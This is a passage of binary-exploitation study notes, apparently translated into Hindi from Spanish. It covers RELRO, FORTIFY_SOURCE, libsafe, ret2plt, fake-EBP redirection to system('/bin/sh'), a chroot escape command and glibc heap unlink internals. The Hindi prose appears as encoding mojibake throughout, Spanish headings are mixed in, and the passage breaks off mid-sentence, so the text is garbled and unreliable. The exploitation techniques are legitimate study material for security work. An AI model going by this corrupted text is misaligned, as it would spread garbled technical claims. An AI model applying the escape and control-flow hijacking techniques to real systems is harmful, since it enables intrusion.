Bind now тАФ> рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рдПрдбреНрд░реЗрд╕реЗрд╕ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдЦреЛрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ .got, .dtors, .ctors, .dynamic, .jcr рдЬреИрд╕реЗ рд╕реЗрдХреНрд╢рдиреНрд╕ рдХреА рдкрд░рдорд┐рд╢рдиреНрд╕ рдХреЛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред **-z relro** рдФрд░ **-z now**

рдЗрд╕рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдЖрдо рддреМрд░ рдкрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдореНрд╕ рдЗрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдХреЙрдореНрдкреНрд▓рд┐рдХреЗрдЯреЗрдб рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ рдЗрд╕рд▓рд┐рдП рдпреЗ рд╣рдорд▓реЗ рдЕрднреА рднреА рд╕рдВрднрд╡ рд╣реЛрддреЗ рд╣реИрдВред

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** тАФ> рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ BIND NOW рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ

**Fortify Source -D_FORTIFY_SOURCE=1 рдпрд╛ =2**

рдпрд╣ рдЙрди рдлрдВрдХреНрд╢рдиреНрд╕ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╕реНрдерд╛рди рд╕реЗ рджреВрд╕рд░реЗ рд╕реНрдерд╛рди рдкрд░ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдХреЙрдкреА рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдлрдВрдХреНрд╢рди рдХреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрдВрдХреНрд╢рди рд╕реЗ рдмрджрд▓ рджреЗрддреЗ рд╣реИрдВред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:\
char buf[16];\
strcpy(but, source);

рдпрд╣ рдЗрд╕реЗ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдирддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ strcpy() рдХреЛ __strcpy_chk() рд╕реЗ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдмрдлрд░ рдХреЗ рдЖрдХрд╛рд░ рдХреЛ рдЕрдзрд┐рдХрддрдо рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

**=1** рдФрд░ **=2** рдХреЗ рдмреАрдЪ рдХрд╛ рдЕрдВрддрд░ рдпрд╣ рд╣реИ:

рджреВрд╕рд░рд╛ рдпрд╣ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ рдХрд┐ **%n** рдПрдХ рд▓рд┐рдЦрдиреЗ рдпреЛрдЧреНрдп рд╕реЗрдХреНрд╢рди рд╕реЗ рдЖрдПред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбрд╛рдпрд░реЗрдХреНрдЯ рдЖрд░реНрдЧреБрдореЗрдВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреЗ рд▓рд┐рдП рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗрд╡рд▓ рддрднреА рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдкрд┐рдЫрд▓реЗ рдЖрд░реНрдЧреБрдореЗрдВрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ, рдпрд╛рдиреА рдХреЗрд╡рд▓ **%3$d** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЕрдЧрд░ рдкрд╣рд▓реЗ **%2$d** рдФрд░ **%1$d** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред

рдПрд░рд░ рдореИрд╕реЗрдЬ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП argv[0] рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдЗрд╕рдореЗрдВ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕реНрдерд╛рди (рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рдЧреНрд▓реЛрдмрд▓ рд╡реЗрд░рд┐рдПрдмрд▓) рдХрд╛ рдПрдбреНрд░реЗрд╕ рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрд░рд░ рдореИрд╕реЗрдЬ рдЙрд╕ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рджрд┐рдЦрд╛рдПрдЧрд╛ред рдкреГрд╖реНрда 191

**Libsafe рдХреА рдЬрдЧрд╣**

рдЗрд╕реЗ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: LD_PRELOAD=/lib/libsafe.so.2\
рдпрд╛\
"/lib/libsave.so.2" > /etc/ld.so.preload

рдпрд╣ рдХреБрдЫ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рдХреЙрд▓реНрд╕ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрдВрдХреНрд╢рдиреНрд╕ рд╕реЗ рдмрджрд▓ рджреЗрддрд╛ рд╣реИред рдпрд╣ рд╕реНрдЯреИрдВрдбрд░реНрдбрд╛рдЗрдЬрд╝реНрдб рдирд╣реАрдВ рд╣реИред (рдХреЗрд╡рд▓ x86 рдХреЗ рд▓рд┐рдП, -fomit-frame-pointer рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓реЗрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рд╕реНрдЯреЗрдЯрд┐рдХ рдХрдВрдкрд╛рдЗрд▓реЗрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ, рд╕рднреА рд╡рд▓реНрдирд░реЗрдмрд▓ рдлрдВрдХреНрд╢рдиреНрд╕ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ LD_PRELOAD suid рдмрд╛рдЗрдирд░реАрдЬрд╝ рдореЗрдВ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ)ред

**ASCII Armored Address Space**

рдпрд╣ 0x00000000 рд╕реЗ 0x00ffffff рддрдХ рд╢реЗрдпрд░реНрдб рд▓рд╛рдЗрдмреНрд░реЗрд░реАрдЬрд╝ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рддрд╛рдХрд┐ рд╣рдореЗрд╢рд╛ рдПрдХ рдмрд╛рдЗрдЯ 0x00 рд╣реЛред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдХрд┐рд╕реА рднреА рд╣рдорд▓реЗ рдХреЛ рд░реЛрдХ рдирд╣реАрдВ рдкрд╛рддрд╛ рд╣реИ, рдФрд░ рдХрдо рд╕реЗ рдХрдо little endian рдореЗрдВред

**ret2plt**

рдпрд╣ ROP рдХреЛ рдЗрд╕ рддрд░рд╣ рд╕реЗ рдХрд░рдиреЗ рдХреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ рдХрд┐ strcpy@plt (PLT рд╕реЗ) рдлрдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ GOT рдХреЗ рдПрдВрдЯреНрд░реА рдкрд░ рдкреЙрдЗрдВрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрдВрдХреНрд╢рди рдЬрд┐рд╕реЗ рдХреЙрд▓ рдХрд░рдирд╛ рд╣реИ (system()) рдХрд╛ рдкрд╣рд▓рд╛ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж рдпрд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ GOT+1 рдкрд░ рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ system() рдХрд╛ рджреВрд╕рд░рд╛ рдмрд╛рдЗрдЯ рдХреЙрдкреА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ... рдЕрдВрдд рдореЗрдВ GOT рдореЗрдВ рд╕реЗрд╡ рдХрд┐рдП рдЧрдП рдПрдбреНрд░реЗрд╕ рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ system() рд╣реЛрдЧрд╛ред

**Falso EBP**

рдЙрди рдлрдВрдХреНрд╢рдиреНрд╕ рдХреЗ рд▓рд┐рдП рдЬреЛ EBP рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрд░реНрдЧреБрдореЗрдВрдЯреНрд╕ рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВ, EIP рдХреЛ рдореЙрдбрд┐рдлрд╛рдИ рдХрд░рдХреЗ рдФрд░ system() рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП EBP рдХреЛ рднреА рдореЙрдбрд┐рдлрд╛рдИ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ рдпрд╣ рдореЗрдореЛрд░реА рдХреЗ рдПрдХ рдЬреЛрди рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░реЗ рдЬрд┐рд╕рдореЗрдВ рдХреЛрдИ рднреА 2 рдмрд╛рдЗрдЯреНрд╕ рд╣реЛрдВ рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж &"/bin/sh" рдХрд╛ рдПрдбреНрд░реЗрд╕ рд╣реЛред

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user тАФ> рдПрдХ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рдмрдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рдиреАрдЪреЗ рдПрдХ рдмреЗрд╕рд┐рдХ рд╕рд┐рд╕реНрдЯрдо рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рддрд╛ рд╣реИ

рдПрдХ рдПрдбрдорд┐рди рдЗрди рдЬреЗрд▓реЛрдВ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддрд╛ рд╣реИ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХрд░рдХреЗ: mkdir foo; chroot foo; cd ..

**рдХреЛрдб рдЗрдВрд╕реНрдЯреНрд░реБрдореЗрдВрдЯреЗрд╢рди**

Valgrind тАФ> рдПрд░рд░реНрд╕ рдЦреЛрдЬрддрд╛ рд╣реИ\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b├бsicos**

**Trozo asignado**

prev_size |\
size | тАФCabecera\
*mem | Datos

**Trozo libre**

prev_size |\
size |\
*fd | Ptr forward chunk\
*bk | Ptr back chunk тАФCabecera\
*mem | Datos

рдореБрдХреНрдд рдЯреБрдХрдбрд╝реЗ рдПрдХ рдбрдмрд▓ рд▓рд┐рдВрдХреНрдб рд▓рд┐рд╕реНрдЯ (bin) рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВ рдФрд░ рджреЛ рдореБрдХреНрдд рдЯреБрдХрдбрд╝реЗ рдХрднреА рдПрдХ рд╕рд╛рде рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ (рд╡реЗ рдЬреБрдбрд╝ рдЬрд╛рддреЗ рд╣реИрдВ)

"size" рдореЗрдВ рдмрд┐рдЯреНрд╕ рд╣реЛрддреЗ рд╣реИрдВ рдЬреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддреЗ рд╣реИрдВ: рдХреНрдпрд╛ рдкрд┐рдЫрд▓рд╛ рдЯреБрдХрдбрд╝рд╛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИ, рдХреНрдпрд╛ рдЯреБрдХрдбрд╝рд╛ mmap() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрд╕рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдХреНрдпрд╛ рдЯреБрдХрдбрд╝рд╛ рдкреНрд░рд╛рдЗрдорд░реА рдПрд░реЗрдирд╛ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИред

рдпрджрд┐ рдХрд┐рд╕реА рдЯреБрдХрдбрд╝реЗ рдХреЛ рдореБрдХреНрдд рдХрд░рддреЗ рд╕рдордп рдХреЛрдИ рд╕рдЯреЗ рд╣реБрдП рдЯреБрдХрдбрд╝реЗ рдореБрдХреНрдд рдкрд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рд╡реЗ unlink() рдореИрдХреНрд░реЛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рд┐рд▓рдп рдХрд░ рджрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдирдП рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреЛ frontlink() рдХреЛ рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рдЙрд╕реЗ рдЙрдЪрд┐рдд bin рдореЗрдВ рдбрд╛рд▓ рд╕рдХреЗред

unlink(){\
BK = P->bk; тАФ> рдирдП рдЪрдВрдХ рдХрд╛ BK рд╡рд╣реА рд╣реЛрдЧрд╛ рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рдореБрдХреНрдд рдерд╛\
FD = P->fd; тАФ> рдирдП рдЪрдВрдХ рдХрд╛ FD рд╡рд╣реА рд╣реЛрдЧрд╛ рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рдореБрдХреНрдд рдерд╛\
FD->bk = BK; тАФ> рдЕрдЧрд▓реЗ рдЪрдВрдХ рдХрд╛ BK рдирдП рдЪрдВрдХ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рддрд╛ рд╣реИ\
BK->fd = FD; тАФ> рдкрд┐рдЫрд▓реЗ рдЪрдВрдХ рдХрд╛ FD рдирдП рдЪрдВрдХ рдХреА рдУрд░ рдЗрд╢
